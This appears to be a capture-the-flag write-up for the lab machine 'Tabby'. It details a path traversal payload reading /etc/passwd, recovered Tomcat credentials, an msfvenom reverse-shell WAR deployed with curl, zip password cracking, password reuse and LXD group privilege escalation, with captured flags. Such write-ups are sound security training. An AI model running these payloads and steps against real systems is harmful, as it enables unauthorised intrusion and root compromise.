# Tabby 

export IP=10.10.10.194

## 1 - nmap scan

cmd: nmap -sC -sV -oN nmap/initial $IP

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
```

Apache on 80 ...
Tomcat on 8080 ... 

## 2 - checking website

Port 80 - nothing stands out from page or source code
Port 8080 - default tomcat page (It works)

Tomcat version: 9.0.31

## 3 - gobuster time

PORT 80

cmd: gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 80 -o gobuster/initial -x php,html,txt

```
/Readme.txt (Status: 200) X
/assets (Status: 301)
/favicon.ico (Status: 200)
/files (Status: 301) (NO permission)
/index.php (Status: 200)
/news.php (Status: 200)
```
----------------------------
PORT 8080

cmd: gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 80 -o gobuster/initial2 -x php,html,txt

```
Nothing interesting
```

## 4 - more digging

First ran the metasploit and checked what it had... it had enumeration for users
```
msfconsole

use scanner/http/tomcat_enum

set TARGETURI /manager
set RHOST 10.10.10.194

run

Users found: admin, both, manager, role1, root, tomcat
```

At the same time ran an nmap scan with the vuln script

```
http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /host-manager/html [POST]
|     /manager/html [HEAD]
|   
|     References:
|       http://capec.mitre.org/data/definitions/274.html
|       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|_      http://www.mkit.com.ar/labs/htexploit/

Also slowloris, but not interested in that (DDOS)
```

## 5 - play a bit more with the website

While checking the other pages, the news tab redirects to

```
http://megahosting.htb/news.php?file=statement
```

if megahosting.htb is substituted by the IP addres we got a statement message<br>
From the URL itself it is quite evident that this may suffer from a LFI (local file inclusion) vulnerability.
<br>

## 6 - LFI'ing this
lets try...
```
http://10.10.10.194/news.php?file=../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin 
syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin 
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false 
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin 
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin 
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin 
pollinate:x:110:1::/var/cache/pollinate:/bin/false 
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin 
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin 
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false 
tomcat:x:997:997::/opt/tomcat:/bin/false 
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false 
ash:x:1000:1000:clive:/home/ash:/bin/bash 
```


From the initial page in port 8080, we have some information 

```
install folder (for the message): /var/lib/tomcat9/webapps/ROOT/index.html
CATALINA_HOME: /usr/share/tomcat9
CATALINA_BASE: /var/lib/tomcat9
From docs: users at $CATALINA_BASE/conf/tomcat-users.xml (DEFAULT)

Lets try: /var/lib/tomcat9/conf/tomcat-users.xml (nothing)
Lets try with catalina_HOME: /usr/share/tomcat9/conf/tomcat-users.xml
```

None of the files were found...<br>
The paths may be different from the documentation shown <br>
Lets try to check the systemd for the <b> tomcat-service</b>

```
[Unit]
Description=Tomcat 9 servlet container
After=network.target

[Service]
Type=forking

User=tomcat
Group=tomcat

Environment="JAVA_HOME=/usr/lib/jvm/default-java"
Environment="JAVA_OPTS=-Djava.security.egd=file:///dev/urandom -Djava.awt.headless=true"

Environment="CATALINA_BASE=/opt/tomcat/latest"
Environment="CATALINA_HOME=/opt/tomcat/latest"
Environment="CATALINA_PID=/opt/tomcat/latest/temp/tomcat.pid"
Environment="CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC"

ExecStart=/opt/tomcat/latest/bin/startup.sh
ExecStop=/opt/tomcat/latest/bin/shutdown.sh

[Install]
WantedBy=multi-user.target
```

With the paths in the CATALINA_BASE nor CATALINA_HOME the tomcat-users.xml was found in the documented paths. <br>

Lets try to reproduce the tomcat instalation <br>

```
sudo apt-cache search tomcat

(...)
tomcat9 - Apache Tomcat 9 - Servlet and JSP engine
(...)

sudo apt install tomcat9

find / -type f -iname "tomcat-users.xml" -print 2>/dev/null

/etc/tomcat9/tomcat-users.xml (NOTHING)
/usr/share/tomcat9/etc/tomcat-users.xml (GOT THE CREDS, in the source code)
```


Creds found
```
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

## 7 - Lets login

Nothing usefull because it can only access 
```
manager/text
host-manager/html
```
## 8 - Roles

From the manager-app documentation (we do not have the html but we have the script which can be used in the terminal)
```
To support these capabilities, Tomcat includes a web application (installed by default on context path /manager) that supports the following functions:
- Deploy a new web application from the uploaded contents of a WAR file.
```


Well, lets check how to create a war file with a shell inside it.
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

Now that we have a shell in .WAR format we just need to know how to upload it
<br>
FROM DOCUMENTATION
```
http://localhost:8080/manager/text/deploy?path=/foo
```

Lets craft a curl request

```
-u : <user:password> Server user and password
-T <file> :  Transfer local FILE to destination

NOTE: need to be single quotes

CMD: curl -u 'tomcat':'$3cureP4s5w0rd123!' -T waza_shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/waza_shell'
```

## 9 - get access


just look around<br>
Found files at /var/www/html/files

```
-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip (lets get this)
drwxr-xr-x 2 root root 4096 Jun 16 20:13 archive (EMPTY)
drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs (EMPTY)
-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement (THE NEWS.php statement)
```

## 10 - Cracking the zip

Zip is password protected (found the too online)... 

```
fcrackzip -u -D -p "/usr/share/wordlists/rockyou.txt" files.zip

Password= admin@it
```
The files had nothing interesting and poking around i did not found any abismal vuln, lets try the password as ash system password<br>
It worked !!

## 11 - PrivEsc

But first lets get the flag

```
cat /home/ash/user.txt

FLAG: 7742122ddba51ab353624a4a9294df62
```

After running linpeas i went ahead and found one binary file suspicious with a pointed CVE but there was no gcc to compile the exploit
```
/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
```

Other thing that i did not noticed and was very highlighted was LXD with RED/YELLOW highlight (99% PE) by linpeas.
```
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) 
```

After a little search i found a vulnerability related to the user being in the lxd group which allows a privesc through its containers to get root privileges

<br>
src: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

<br>
I followed the second method in my local machine until the import step (there i uploaded the produced files to the target machine) 

After following the exploitation
```
whomai 
root

find / -type f -iname "root.txt" -print 2>/dev/null
/mnt/root/root/root.txt
cat /mnt/root/root/root.txt
FLAG: 7ced683256bc943cb1980254e1f86b72
```





